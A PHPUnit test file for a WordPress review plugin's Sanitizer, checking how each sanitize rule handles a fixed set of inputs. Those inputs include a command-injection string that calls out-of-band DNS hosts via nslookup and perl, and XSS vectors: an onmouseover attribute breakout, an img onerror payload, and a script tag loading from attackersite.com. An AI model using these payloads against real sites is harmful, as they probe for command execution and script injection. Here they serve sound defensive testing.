<?php

namespace GeminiLabs\SiteReviews\Tests;

use GeminiLabs\SiteReviews\Modules\Sanitizer;

/**
 * Test case for the Plugin.
 * @group plugin
 */
class SanitizerTest extends \WP_UnitTestCase
{
    protected $testValues;

    public function set_up()
    {
        parent::set_up();
        $this->testValues = [
            0 => '',
            1 => 'abc',
            2 => ['1'],
            3 => ['a' => false],
            4 => [13],
            5 => [0],
            6 => ['1' => 13],
            7 => (object) ['b' => true],
            8 => true,
            9 => false,
            10 => '<script>var x = 23;</script>',
            11 => "<h3>This is a\n title!</h3>",
            12 => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width" onmouseover="alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => -1,
        ];
    }

    public function test_sanitize_array_consolidate()
    {
        $sanitized = $this->sanitize('array-consolidate');
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => ['1'],
            3 => ['a' => false],
            4 => [13],
            5 => [0],
            6 => ['1' => 13],
            7 => ['b' => true],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [],
            14 => [],
            15 => [],
            16 => [],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
        ]);
    }

    public function test_sanitize_array_int()
    {
        $sanitized = $this->sanitize('array-int');
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => [1],
            3 => [],
            4 => [13],
            5 => [],
            6 => [13],
            7 => [],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [1989],
            14 => [],
            15 => [],
            16 => [2020],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
        ]);
    }

    public function test_sanitize_array_string()
    {
        $sanitized = $this->sanitize('array-string');
        $this->assertEquals($sanitized, [
            0 => [],
            1 => ['abc'],
            2 => ['1'],
            3 => [],
            4 => [],
            5 => [],
            6 => [],
            7 => [],
            8 => [],
            9 => [],
            10 => [''],
            11 => ['This is a title!'],
            12 => [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
            13 => ['June 13', '1989'],
            14 => ['03-12-2020'],
            15 => ['0-0-2020'],
            16 => ['2020'],
            17 => ['李祖阳 xx xx'],
            18 => ['#ax+dex(tomorrow) $200 200% @peter'],
            19 => ['this is true'],
            20 => ['single-review full-width" "alert(69)'],
            21 => ['matt@wordpress.org'],
            22 => ['https//wordpress.org'],
            23 => ['wordpress.org'],
            24 => ['www.wordpress.org'],
            25 => ['https://wordpress.org'],
            26 => ['-1'],
        ]);
    }

    public function test_sanitize_attr()
    {
        $sanitized = $this->sanitize('attr');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '&lt;script&gt;var x = 23;&lt;/script&gt;',
            11 => "&lt;h3&gt;This is a\n title!&lt;/h3&gt;",
            12 => ';(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(&#039;hissstgxwgukmocpc5c80.me&#039;))',
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width&quot; onmouseover=&quot;alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '-1',
        ]);
    }

    public function test_sanitize_attr_class()
    {
        $sanitized = $this->sanitize('attr-class');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => 'scriptvar x script',
            11 => 'h3This is a titleh3',
            12 => 'nslookup hit-gx_wgukmocpc5c8ddddcomperl -e gethostbynamehissstgxwgukmocpc5c80me',
            13 => 'June',
            14 => '-12-2020',
            15 => '-0-2020',
            16 => '',
            17 => 'xx',
            18 => 'axdextomorrow peter',
            19 => 'this is true',
            20 => 'single-review full-width onmouseoveralert69',
            21 => 'mattwordpressorg',
            22 => 'httpswordpressorg',
            23 => 'wordpressorg',
            24 => 'wwwwordpressorg',
            25 => 'https:wordpressorg',
            26 => '-1',
        ]);
    }

    public function test_sanitize_attr_style()
    {
        $values = $this->testValues;
        $values[] = 'color:red';
        $values[] = 'color:red;';
        $values[] = 'color: red; margin:0';
        $values[] = 'color: #000';
        $values[] = 'color: #000;margin';
        $values[] = 'color: #000 !important;';
        $sanitized = $this->sanitize('attr-style', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
            27 => 'color: red;',
            28 => 'color: red;',
            29 => 'color: red; margin: 0;',
            30 => 'color: #000;',
            31 => 'color: #000;',
            32 => 'color: #000 !important;',
        ]);
    }

    public function test_sanitize_color()
    {
        $values = $this->testValues;
        $values[] = '#';
        $values[] = '#1';
        $values[] = '#11';
        $values[] = '#111';
        $values[] = 'rgb()';
        $values[] = 'rgb(0 0 0)';
        $values[] = 'rgb(0,0,0)';
        $values[] = 'rgba(0,0,0)';
        $values[] = 'rgba(0,0,0,99)';
        $values[] = 'rgba(0 0 0 / .2)';
        $values[] = 'rgba(0,0,0,1)';
        $sanitized = $this->sanitize('color', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
            27 => '',
            28 => '',
            29 => '',
            30 => '#111',
            31 => '',
            32 => '',
            33 => 'rgb(0,0,0)',
            34 => '',
            35 => '',
            36 => '',
            37 => 'rgba(0,0,0,1)',
        ]);
    }

    public function test_sanitize_date()
    {
        $sanitized = $this->sanitize('date');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '1989-06-13 00:00:00',
            14 => '2020-12-03 00:00:00',
            15 => '2019-11-30 00:00:00',
            16 => wp_date('Y-m-d H:i:s', strtotime('2020')),
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => wp_date('Y-m-d H:i:s', strtotime('-1')),
        ]);
        $sanitized = $this->sanitize('date:Y-m-d');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '1989-06-13',
            14 => '2020-12-03',
            15 => '2019-11-30',
            16 => wp_date('Y-m-d', strtotime('2020')),
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => wp_date('Y-m-d', strtotime('-1')),
        ]);
    }

    public function test_sanitize_email()
    {
        $sanitized = $this->sanitize('email');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => 'matt@wordpress.org',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
        ]);
    }

    public function test_sanitize_id()
    {
        $sanitized = $this->sanitize('id');
        $this->assertEquals($sanitized[0], '');
        $this->assertEquals($sanitized[1], 'abc');
        $this->assertEquals($sanitized[2], '');
        $this->assertEquals($sanitized[3], '');
        $this->assertEquals($sanitized[4], '');
        $this->assertEquals($sanitized[5], '');
        $this->assertEquals($sanitized[6], '');
        $this->assertEquals($sanitized[7], '');
        $this->assertEquals($sanitized[8], '');
        $this->assertEquals($sanitized[9], '');
        $this->assertEquals($sanitized[10], '');
        $this->assertEquals($sanitized[11], 'thisisatitle');
        $this->assertEquals($sanitized[12], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized[13], 'june131989');
        $this->assertEquals($sanitized[14], '-12-2020');
        $this->assertEquals($sanitized[15], '-0-2020');
        $this->assertEquals($sanitized[16], '');
        $this->assertEquals($sanitized[17], 'xxxx');
        $this->assertEquals($sanitized[18], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized[19], 'thisistrue');
        $this->assertEquals($sanitized[20], 'single-reviewfull-widthalert69');
        $this->assertEquals($sanitized[21], 'mattwordpressorg');
        $this->assertEquals($sanitized[22], 'httpswordpressorg');
        $this->assertEquals($sanitized[23], 'wordpressorg');
        $this->assertEquals($sanitized[24], 'wwwwordpressorg');
        $this->assertEquals($sanitized[25], 'httpswordpressorg');
        $this->assertEquals($sanitized[26], '-1');
    }

    public function test_sanitize_id_hash()
    {
        $sanitized = glsr(Sanitizer::class)->sanitizeIdHash('', 'form_');
        $this->assertMatchesRegularExpression('/form_([a-z0-9]{8})/', $sanitized);
        $sanitized = $this->sanitize('id-hash');
        $pattern = '/glsr_([a-z0-9]{8})/';
        $this->assertMatchesRegularExpression($pattern, $sanitized[0]);
        $this->assertEquals($sanitized[1], 'abc');
        $this->assertMatchesRegularExpression($pattern, $sanitized[2]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[3]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[4]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[5]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[6]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[7]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[8]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[9]);
        $this->assertMatchesRegularExpression($pattern, $sanitized[10]);
        $this->assertEquals($sanitized[11], 'thisisatitle');
        $this->assertEquals($sanitized[12], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized[13], 'june131989');
        $this->assertEquals($sanitized[14], '-12-2020');
        $this->assertEquals($sanitized[15], '-0-2020');
        $this->assertMatchesRegularExpression($pattern, $sanitized[16]);
        $this->assertEquals($sanitized[17], 'xxxx');
        $this->assertEquals($sanitized[18], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized[19], 'thisistrue');
        $this->assertEquals($sanitized[20], 'single-reviewfull-widthalert69');
        $this->assertEquals($sanitized[21], 'mattwordpressorg');
        $this->assertEquals($sanitized[22], 'httpswordpressorg');
        $this->assertEquals($sanitized[23], 'wordpressorg');
        $this->assertEquals($sanitized[24], 'wwwwordpressorg');
        $this->assertEquals($sanitized[25], 'httpswordpressorg');
        $this->assertEquals($sanitized[26], '-1');
    }

    public function test_sanitize_ip_address()
    {
        $values = $this->testValues;
        $values[27] = '127*';
        $values[28] = '127.*';
        $values[29] = '127.0.*';
        $values[30] = '127.0.0.*';
        $values[31] = '127.0.0.1';
        $values[32] = '103.21.244.0/22';
        $values[33] = '2400:cb00';
        $values[34] = '2400:cb00::';
        $values[35] = '2400:cb00::/32';
        $sanitized = $this->sanitize('ip-address', $values);
        $this->assertEquals($sanitized[0], '');
        $this->assertEquals($sanitized[1], '');
        $this->assertEquals($sanitized[2], '');
        $this->assertEquals($sanitized[3], '');
        $this->assertEquals($sanitized[4], '');
        $this->assertEquals($sanitized[5], '');
        $this->assertEquals($sanitized[6], '');
        $this->assertEquals($sanitized[7], '');
        $this->assertEquals($sanitized[8], '');
        $this->assertEquals($sanitized[9], '');
        $this->assertEquals($sanitized[10], '');
        $this->assertEquals($sanitized[11], '');
        $this->assertEquals($sanitized[12], '');
        $this->assertEquals($sanitized[13], '');
        $this->assertEquals($sanitized[14], '');
        $this->assertEquals($sanitized[15], '');
        $this->assertEquals($sanitized[16], '');
        $this->assertEquals($sanitized[17], '');
        $this->assertEquals($sanitized[18], '');
        $this->assertEquals($sanitized[19], '');
        $this->assertEquals($sanitized[20], '');
        $this->assertEquals($sanitized[21], '');
        $this->assertEquals($sanitized[22], '');
        $this->assertEquals($sanitized[23], '');
        $this->assertEquals($sanitized[24], '');
        $this->assertEquals($sanitized[25], '');
        $this->assertEquals($sanitized[26], '');
        $this->assertEquals($sanitized[27], '');
        $this->assertEquals($sanitized[28], '');
        $this->assertEquals($sanitized[29], '');
        $this->assertEquals($sanitized[30], '');
        $this->assertEquals($sanitized[31], '127.0.0.1');
        $this->assertEquals($sanitized[32], '');
        $this->assertEquals($sanitized[33], '');
        $this->assertEquals($sanitized[34], '2400:cb00::');
        $this->assertEquals($sanitized[35], '');
    }

    public function test_sanitize_json()
    {
        $sanitized = $this->sanitize('json');
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => ['1'],
            3 => ['a' => false],
            4 => [13],
            5 => [0],
            6 => [1 => 13],
            7 => ['b' => true],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [],
            14 => [],
            15 => [],
            16 => [],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
        ]);
    }

    public function test_sanitize_key()
    {
        $sanitized = $this->sanitize('key');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '',
            11 => 'thisisatitle',
            12 => 'nslookuphit_gx_wgukmocpc5c8ddddc',
            13 => 'june131989',
            14 => '03_12_2020',
            15 => '0_0_2020',
            16 => '2020',
            17 => 'xxxx',
            18 => 'axdextomorrow200200peter',
            19 => 'thisistrue',
            20 => 'single_reviewfull_widthalert69',
            21 => 'mattwordpressorg',
            22 => 'httpswordpressorg',
            23 => 'wordpressorg',
            24 => 'wwwwordpressorg',
            25 => 'httpswordpressorg',
            26 => '_1',
        ]);
    }

    public function test_sanitize_max()
    {
        $sanitized = $this->sanitize('max:21');
        $this->assertEquals($sanitized, [
            0 => 0,
            1 => 0,
            2 => 0,
            3 => 0,
            4 => 0,
            5 => 0,
            6 => 0,
            7 => 0,
            8 => 1,
            9 => 0,
            10 => 0,
            11 => 0,
            12 => 0,
            13 => 0,
            14 => 0,
            15 => 0,
            16 => 21,
            17 => 0,
            18 => 0,
            19 => 0,
            20 => 0,
            21 => 0,
            22 => 0,
            23 => 0,
            24 => 0,
            25 => 0,
            26 => -1,
        ]);
    }

    public function test_sanitize_min()
    {
        $sanitized = $this->sanitize('min:13');
        $this->assertEquals($sanitized, [
            0 => 13,
            1 => 13,
            2 => 13,
            3 => 13,
            4 => 13,
            5 => 13,
            6 => 13,
            7 => 13,
            8 => 13,
            9 => 13,
            10 => 13,
            11 => 13,
            12 => 13,
            13 => 13,
            14 => 13,
            15 => 13,
            16 => 2020,
            17 => 13,
            18 => 13,
            19 => 13,
            20 => 13,
            21 => 13,
            22 => 13,
            23 => 13,
            24 => 13,
            25 => 13,
            26 => 13,
        ]);
    }

    public function test_sanitize_min_max()
    {
        $sanitized = $this->sanitize('min:3|max:50');
        $this->assertEquals($sanitized, [
            0 => 3,
            1 => 3,
            2 => 3,
            3 => 3,
            4 => 3,
            5 => 3,
            6 => 3,
            7 => 3,
            8 => 3,
            9 => 3,
            10 => 3,
            11 => 3,
            12 => 3,
            13 => 3,
            14 => 3,
            15 => 3,
            16 => 50,
            17 => 3,
            18 => 3,
            19 => 3,
            20 => 3,
            21 => 3,
            22 => 3,
            23 => 3,
            24 => 3,
            25 => 3,
            26 => 3,
        ]);
    }

    public function test_sanitize_name()
    {
        $sanitized = $this->sanitize('name');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => 'thisisatitle',
            12 => 'nslookuphit-gx_wgukmocpccddddcomperl-egethostbynamehissstgxwgukmocpccme',
            13 => 'june',
            14 => '',
            15 => '',
            16 => '',
            17 => 'xxxx',
            18 => 'axdextomorrowpeter',
            19 => 'thisistrue',
            20 => 'single-reviewfull-widthalert',
            21 => 'mattwordpressorg',
            22 => 'httpswordpressorg',
            23 => 'wordpressorg',
            24 => 'wwwwordpressorg',
            25 => 'httpswordpressorg',
            26 => '',
        ]);
    }

    public function test_sanitize_numeric()
    {
        $sanitized = $this->sanitize('numeric');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '2020',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '-1',
        ]);
    }

    public function test_sanitize_post_ids()
    {
        $posts = self::factory()->post->create_many(2);
        $values = $this->testValues;
        $values[] = $posts[0];
        $values[] = $posts;
        $values[] = implode(',', $posts);
        $values[] = array_diff([1,2,3,4,5,6,7,8,9], $posts);
        $sanitized = $this->sanitize('post-ids', $values);
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => [],
            3 => [],
            4 => [],
            5 => [],
            6 => [],
            7 => [],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [],
            14 => [],
            15 => [],
            16 => [],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
            27 => [$posts[0]],
            28 => $posts,
            29 => $posts,
            30 => [],
        ]);
    }

    public function test_sanitize_rating()
    {
        add_filter('site-reviews/const/MAX_RATING', fn () => 5);
        add_filter('site-reviews/const/MIN_RATING', '__return_zero');
        $sanitized = $this->sanitize('rating');
        $this->assertEquals($sanitized, [
            0 => 0,
            1 => 0,
            2 => 0,
            3 => 0,
            4 => 0,
            5 => 0,
            6 => 0,
            7 => 0,
            8 => 1,
            9 => 0,
            10 => 0,
            11 => 0,
            12 => 0,
            13 => 0,
            14 => 0,
            15 => 0,
            16 => 5,
            17 => 0,
            18 => 0,
            19 => 0,
            20 => 0,
            21 => 0,
            22 => 0,
            23 => 0,
            24 => 0,
            25 => 0,
            26 => 0,
        ]);
    }

    public function test_sanitize_regex()
    {
        $sanitized = $this->sanitize('regex');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => '',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
        ]);
        $sanitized = $this->sanitize('regex:/[^\w\-]/');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => 'scriptvarx23script',
            11 => 'h3Thisisatitleh3',
            12 => 'nslookuphit-gx_wgukmocpc5c8ddddcomperl-egethostbynamehissstgxwgukmocpc5c80me',
            13 => 'June131989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => 'xxxx',
            18 => 'axdextomorrow200200peter',
            19 => 'thisistrue',
            20 => 'single-reviewfull-widthonmouseoveralert69',
            21 => 'mattwordpressorg',
            22 => 'httpswordpressorg',
            23 => 'wordpressorg',
            24 => 'wwwwordpressorg',
            25 => 'httpswordpressorg',
            26 => '-1',
        ]);
    }

    public function test_sanitize_slug()
    {
        $sanitized = $this->sanitize('slug');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '',
            11 => 'this-is-a-title',
            12 => 'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
            13 => 'june-13-1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '%e6%9d%8e%e7%a5%96%e9%98%b3-xx-xx',
            18 => 'axdextomorrow-200-200-peter',
            19 => 'this-is-true',
            20 => 'single-review-full-width-alert69',
            21 => 'mattwordpress-org',
            22 => 'https-wordpress-org',
            23 => 'wordpress-org',
            24 => 'www-wordpress-org',
            25 => 'https-wordpress-org',
            26 => '1',
        ]);
    }

    public function test_sanitize_term_ids()
    {
        $terms = self::factory()->term->create_many(2, ['taxonomy' => glsr()->taxonomy]);
        $values = $this->testValues;
        $values[] = $terms[0];
        $values[] = $terms;
        $values[] = implode(',', $terms);
        $values[] = array_diff([1,2,3,4,5,6,7,8,9], $terms);
        $sanitized = $this->sanitize('term-ids', $values);
        $this->assertEquals($sanitized, [
            0 => [],
            1 => [],
            2 => [],
            3 => [],
            4 => [],
            5 => [],
            6 => [],
            7 => [],
            8 => [],
            9 => [],
            10 => [],
            11 => [],
            12 => [],
            13 => [],
            14 => [],
            15 => [],
            16 => [],
            17 => [],
            18 => [],
            19 => [],
            20 => [],
            21 => [],
            22 => [],
            23 => [],
            24 => [],
            25 => [],
            26 => [],
            27 => [$terms[0]],
            28 => $terms,
            29 => $terms,
            30 => [],
        ]);
    }

    public function test_sanitize_text()
    {
        $sanitized = $this->sanitize('text');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => '',
            11 => 'This is a title!',
            12 => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width" "alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '-1',
        ]);
    }

    public function test_sanitize_text_html()
    {
        $values = $this->testValues;
        $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
        $sanitized = $this->sanitize('text-html', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => 'var x = 23;',
            11 => "This is a\n title!",
            12 => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width" "alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '-1',
            27 => '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is <em>a link</em> and a <strong>link</strong>',
            28 => '&lt;img src=x alert(55)&gt;',
            29 => '&lt;script src=https://attackersite.com/test.js&gt;',
        ]);
        $sanitized = $this->sanitize('text-html:a,img', [$values[27], $values[28]]);
        $this->assertEquals($sanitized, [
            '<a id="xxx" href="https://apple.com" title="hello" target="_blank">Hello</a> this is a link and a link',
            '&lt;img sr<img src="x">c=x alert(55)&gt;',
        ]);
    }

    public function test_sanitize_text_multiline()
    {
        $values = $this->testValues;
        $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
        $sanitized = $this->sanitize('text-multiline', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => 'var x = 23;',
            11 => "This is a\n title!",
            12 => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width" "alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '-1',
            27 => 'Hello this is a link and a link',
            28 => '&lt;img src=x alert(55)&gt;',
            29 => '&lt;script src=https://attackersite.com/test.js&gt;',
        ]);
    }

    public function test_sanitize_text_post()
    {
        $values = $this->testValues;
        $values[] = '<div><span><a id="xxx" href="https://apple.com" title="hello" target="_blank"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>';
        $values[] = '<img sr<img src="x">c=x onerror=alert(55)>';
        $values[] = '<script sr<img src="x">c=https://attackersite.com/test.js>';
        $sanitized = $this->sanitize('text-post', $values);
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'abc',
            2 => '1',
            3 => '',
            4 => '13',
            5 => '0',
            6 => '13',
            7 => '',
            8 => '1',
            9 => '',
            10 => 'var x = 23;',
            11 => "<h3>This is a\n title!</h3>",
            12 => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname(\'hissstgxwgukmocpc5c80.me\'))",
            13 => 'June 13, 1989',
            14 => '03-12-2020',
            15 => '0-0-2020',
            16 => '2020',
            17 => '李祖阳 xx xx',
            18 => '#ax+dex(tomorrow) $200 200% @peter',
            19 => 'this is true',
            20 => 'single-review full-width\" \"alert(69)',
            21 => 'matt@wordpress.org',
            22 => 'https//wordpress.org',
            23 => 'wordpress.org',
            24 => 'www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '-1',
            27 => '<div><span><a id=\"xxx\" href=\"https://apple.com\" title=\"hello\" target=\"_blank\"><span>Hello</span></a> this is <em>a link</em> and a <strong>link</strong></span></div><ul><li></li></ul>',
            28 => '&lt;img sr<img src=\"x\">c=x alert(55)&gt;',
            29 => '&lt;script sr<img src=\"x\">c=https://attackersite.com/test.js&gt;',
        ]);
    }

    public function test_sanitize_url()
    {
        $sanitized = $this->sanitize('url');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => 'https://abc',
            2 => 'https://1',
            3 => '',
            4 => 'https://13',
            5 => 'https://0',
            6 => 'https://13',
            7 => '',
            8 => 'https://1',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => 'https://03-12-2020',
            15 => 'https://0-0-2020',
            16 => 'https://2020',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => 'https://matt@wordpress.org',
            22 => 'https://https//wordpress.org',
            23 => 'https://wordpress.org',
            24 => 'https://www.wordpress.org',
            25 => 'https://wordpress.org',
            26 => '',
        ]);
    }

    public function test_sanitize_user_email()
    {
        $sanitized = $this->sanitize('user-email');
        $this->assertEquals($sanitized, [
            0 => '',
            1 => '',
            2 => '',
            3 => '',
            4 => '',
            5 => '',
            6 => '',
            7 => '',
            8 => '',
            9 => '',
            10 => '',
            11 => '',
            12 => '',
            13 => '',
            14 => '',
            15 => '',
            16 => '',
            17 => '',
            18 => '',
            19 => '',
            20 => '',
            21 => 'matt@wordpress.org',
            22 => '',
            23 => '',
            24 => '',
            25 => '',
            26 => '',
        ]);
    }

    public function test_sanitize_user_id()
    {
        $userId1 = self::factory()->user->create();
        $userId2 = self::factory()->user->create();
        $values = $this->testValues;
        $values[] = $userId1;
        $sanitized = $this->sanitize('user-id', $values);
        $this->assertEquals($sanitized, [
            0 => 0,
            1 => 0,
            2 => 0,
            3 => 0,
            4 => 0,
            5 => 0,
            6 => 0,
            7 => 0,
            8 => 0,
            9 => 0,
            10 => 0,
